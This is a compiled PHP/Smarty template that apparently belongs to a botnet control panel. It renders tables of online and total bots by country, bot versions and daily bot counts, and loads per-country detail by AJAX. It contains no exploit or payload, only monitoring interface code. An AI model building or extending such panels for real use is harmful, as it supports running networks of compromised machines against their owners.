<?php /* Smarty version Smarty-3.0.6, created on 2011-03-26 04:06:43
         compiled from "Z:/home/gate/www/client/templates\botsmon_country.tpl" */ ?>
<?php /*%%SmartyHeaderCode:81524d8d3c23f164e1-23297414%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    '73d6c86e514ba5272b68c528f97726e3d7d587fd' => 
    array (
      0 => 'Z:/home/gate/www/client/templates\\botsmon_country.tpl',
      1 => 1297864878,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '81524d8d3c23f164e1-23297414',
  'function' => 
  array (
  ),
  'has_nocache_code' => false,
)); /*/%%SmartyHeaderCode%%*/?>

<script type="text/javascript">
function getState(idc) 
{
	var b = document.getElementById('bfc' + idc);
	var tr = document.getElementById('tfc' + idc);
	var td = document.getElementById('fc' + idc);
	if (b && tr && td) 
	{
		if (b.src.indexOf('icos/info.png') == -1) {
		
			b.src = 'img/icos/info.png';
			td.innerHTML = '';
		}
		else 
		{
			$("#fc"+idc).load('./mod/botsmon_state.php?idc=' + idc);
			b.src = 'img/icos/info-gray16.png';
		}
	}
}
</script>


<?php if (isset($_smarty_tpl->getVariable('CONT_ARR',null,true,false)->value)){?>
<h2><b>GEO info</b></h2>
<script>displayAlrmElts();</script>

<table width='740px' border='1' cellspacing='0' cellpadding='0' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'><th>Flag</th><th>Country</th><th>Online Bots/All Bots</th><th>Detail State</th>

<?php  $_smarty_tpl->tpl_vars['REC'] = new Smarty_Variable;
 $_from = $_smarty_tpl->getVariable('CONT_ARR')->value; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array');}
if ($_smarty_tpl->_count($_from) > 0){
    foreach ($_from as $_smarty_tpl->tpl_vars['REC']->key => $_smarty_tpl->tpl_vars['REC']->value){
?>
	<tr align='center' id=tid<?php echo $_smarty_tpl->tpl_vars['REC']->value['I'];?>
>
	<td width='30px'><img border='0' src='img/flags/<?php echo $_smarty_tpl->tpl_vars['REC']->value['CCODE'];?>
.gif'></td>
	<td width='200px'><?php echo $_smarty_tpl->tpl_vars['REC']->value['MRES_NC'];?>
</td>
	<td><font style='font-size: 14px;'>(<?php echo $_smarty_tpl->tpl_vars['REC']->value['ACTB_CNT'];?>
/<?php echo $_smarty_tpl->tpl_vars['REC']->value['ALLB_CNT'];?>
)</font></td>
	<td width='30px'><a href='javascript:void();' onclick='getState(<?php echo $_smarty_tpl->tpl_vars['REC']->value['IDC'];?>
); return false;'><img id='bfc<?php echo $_smarty_tpl->tpl_vars['REC']->value['IDC'];?>
' src='img/icos/info.png' border='0'></a></td>
	</tr>
	<tr align='center' id='tfc<?php echo $_smarty_tpl->tpl_vars['REC']->value['IDC'];?>
'><td></td><td id='fc<?php echo $_smarty_tpl->tpl_vars['REC']->value['IDC'];?>
' colspan='3'></td></tr>
<?php }} else { ?>
<?php } ?>
</table>
<?php }else{ ?>
	<font class='error'>There are no bots</font>
<?php }?>

<?php if (isset($_smarty_tpl->getVariable('CONT_ARR2',null,true,false)->value)){?>
<h2><b>Version info</b></h2>

<table width='240px' border='1' cellspacing='0' cellpadding='0' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'><th>Version</th><th>Count (online / all)</th>

	<?php  $_smarty_tpl->tpl_vars['ITEM'] = new Smarty_Variable;
 $_from = $_smarty_tpl->getVariable('CONT_ARR2')->value; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array');}
if ($_smarty_tpl->_count($_from) > 0){
    foreach ($_from as $_smarty_tpl->tpl_vars['ITEM']->key => $_smarty_tpl->tpl_vars['ITEM']->value){
?><?php echo $_smarty_tpl->tpl_vars['ITEM']->value;?>
<?php }} ?>
	
</table>
<?php }?>

<?php if (isset($_smarty_tpl->getVariable('CONT_ARR3',null,true,false)->value)){?>
<h2><b>Count of bots for last 5 days</b></h2>

<table width='240px' border='1' cellspacing='0' cellpadding='0' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'><th>Date</th><th>Count (online / all)</th>

	<?php  $_smarty_tpl->tpl_vars['ITEM'] = new Smarty_Variable;
 $_from = $_smarty_tpl->getVariable('CONT_ARR3')->value; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array');}
if ($_smarty_tpl->_count($_from) > 0){
    foreach ($_from as $_smarty_tpl->tpl_vars['ITEM']->key => $_smarty_tpl->tpl_vars['ITEM']->value){
?><?php echo $_smarty_tpl->tpl_vars['ITEM']->value;?>
<?php }} ?>
</table>
<?php }?>